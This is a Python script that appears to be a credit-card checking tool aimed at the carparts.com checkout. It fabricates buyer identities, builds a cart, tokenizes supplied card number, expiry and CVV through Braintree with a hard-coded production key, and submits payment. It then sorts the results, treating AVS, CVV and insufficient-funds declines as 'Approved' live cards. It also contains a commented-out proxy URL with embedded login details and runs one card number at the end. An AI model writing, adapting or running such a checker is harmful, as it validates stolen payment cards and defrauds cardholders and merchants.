import datetime
import random
import uuid
from faker import Faker
import names
from requests import Session
from dataclasses import dataclass
from retry import retry

def generate_usa_address():
	fake = Faker('en_US')
	try:
		first_name = fake.first_name()
		last_name = fake.last_name()
		return {
			"firstname": first_name,
			"lastname": last_name,
			"email": f"{first_name.lower()}{last_name.lower()}{fake.random_number(digits=3)}@{fake.free_email_domain()}",
			"street": (f"{random.randint(1000, 9999)} {random.choice(['nw', 'sw', 'ne', 'se'])} {random.randint(1, 100)}th {random.choice(['st', 'ave', 'blvd', 'rd'])}"),
			"city": fake.city(),
			"state": fake.state_abbr(),
			"postcode": str(random.randint(33100, 33199)),
			"telephone": fake.numerify('305#######'),
			"date": (datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%dT%H:%M:%S.') + f'{int((datetime.datetime.now(datetime.UTC).microsecond) / 1000):03d}Z')

		}
	except KeyError:
		return generate_usa_address()
        

class ConfigsPAge:
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        
            self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
            try:
                return self.uophs
            
            except: 
                return 'value not found' 
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    @classmethod
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'
    
        
    
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)


#proxy_url = 'http://77b7b08f59b2dcc1:RNW78Fm5@res.proxy-seller.com:10000'

class Salchichons:
#    @retry(tries=3)
    def main(self,card):
      #  try:
            self.ccs = card.split('|')
            self.Nombre = ConfigsPAge().RandomName('username')
            self.UseMail = ConfigsPAge().RandomName('correo')
            firstname, lastname, email, phone, street, postcode, date = (generate_usa_address().get(k, '') for k in ['firstname', 'lastname', 'email', 'telephone', 'street', 'postcode', 'date'])

            if self.ccs[0].startswith("4"): self.brand = "VISA"
            if self.ccs[0].startswith("3"): self.brand = "AMEX"
            if self.ccs[0].startswith("6"): self.brand = "DISCOVER"
            elif self.ccs[0].startswith("5"): self.brand = "MASTER_CARD"

            self.session = Session()
            #self.session.proxies.update({'http': proxy_url,'https': proxy_url})

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','if-none-match': '"jk35biuw5l63u9"','priority': 'u=0, i','referer': 'https://www.carparts.com/brake-caliper-bolt?itemperpage=20&currentpage=2&sort=best-match','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            response = self.session.get('https://www.carparts.com/brake-caliper-bolt/dorman/rbhw14112', headers=headers)

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','apikey': 'anzhbnJvaXVz','content-type': 'application/json','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/brake-caliper-bolt/dorman/rbhw14112','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'items': [{'product': {'productId': '1776514','sku': 'RBHW14112','brand': {'name': 'Dorman',},},'modifiers': {'quantity': 1,},'buffereta': 0,},],'modifiers': {'location': {'zipcode': '61301','state': 'IL',},},'domain': 'carparts.com','buffereta': 0,}
            r1 = self.session.put('https://can-api.carparts.com/shopping-cart/v1/items/', headers=headers, json=json_data)
            cart_id = r1.json()['data']['cartId']

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/cart','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'domain': 'carparts.com','orderId': cart_id,}
            r2 = self.session.post('https://can-api.carparts.com/auth/v1/token/request-access', headers=headers, json=json_data,)
            accessToken = r2.json()['data']['accessToken']

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','accesstoken': accessToken,'apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/cart','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'deliveryPostcode': '61301','deliveryState': 'IL','deliveryCity': 'La Salle','deliveryCountry': 'US','shippingMethod': 'Ground','shippingProtection': True,}
            response = self.session.post(f'https://can-api.carparts.com/checkout/v1/orders/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71', headers=headers, json=json_data,)

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','accesstoken': accessToken,'apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/checkout','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'deliveryPostcode': postcode,'deliveryState': 'NY','deliveryCity': 'New York','deliveryCountry': 'US','shippingProtection': True,'cartId': cart_id,'dateUpdated': date,'deliveryFirstName': f'{firstname} {lastname}','deliveryLastName': firstname,'productProtection': True,'wmo': 'b','deliveryStreetAddress': street,'deliverySuburbAddress': '','deliveryTelephone': phone,'deliveryTracking': False,'deliveryEmailAddress': email,'promotionalEmail': True,'deliveryName': f'{firstname} {lastname}',}
            response = self.session.patch(f'https://can-api.carparts.com/checkout/v1/shipments/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71', headers=headers, json=json_data,)
            
            self.client_id = ConfigsPAge().SessionId()

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': 'Bearer production_7sf6sbqp_s3ftdgcyg5pv5qf8','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.ccs[0],'expirationMonth': self.ccs[1],'expirationYear': self.ccs[2],'cvv': self.ccs[3],},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            r3 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = ConfigsPAge().QueryText(r3.text,'{"token":"','"')

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','accesstoken': accessToken,'apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/checkout','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'paymentMethod': 'CreditCard','paymentMethodToken': '','cvv': '','cctype': '','cpgid': '','paymentMethodNonce': self.token_card,}
            response = self.session.post(f'https://can-api.carparts.com/checkout/v1/payments/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71', headers=headers, json=json_data,)

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','accesstoken': accessToken,'apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/checkout','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {}
            r4 = self.session.post(f'https://can-api.carparts.com/checkout/v1/payments/card/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71', headers=headers, json=json_data,)
            Suceess = r4.text            
            msg = ConfigsPAge().QueryText(Suceess,'"message":"', '"')
            self.session.close()
            

            if r4.status_code == 302 or r4.status_code == 200:
                status = "Approved! ✅"
                msg = "$11.99"
            elif msg == "Payment declined. Gateway Rejected: avs":
                status = "Approved! ✅"
            elif msg == "Payment declined. Insufficient Funds":
                status = "Approved! ✅"
            elif (
                msg == "Payment declined. Card Issuer Declined CVV"
                or msg == "Payment declined. avs_and_cvv"
                or msg == "cvv"
            ):
                status = "Approved! ✅"
            else:
                status = "Dead! ❌"

            return status, msg

 #       except: 
    #        return 'Declined! ❌','Declined - Call Issue'


print(Salchichons().main('4426441313931192|10|2028|818'))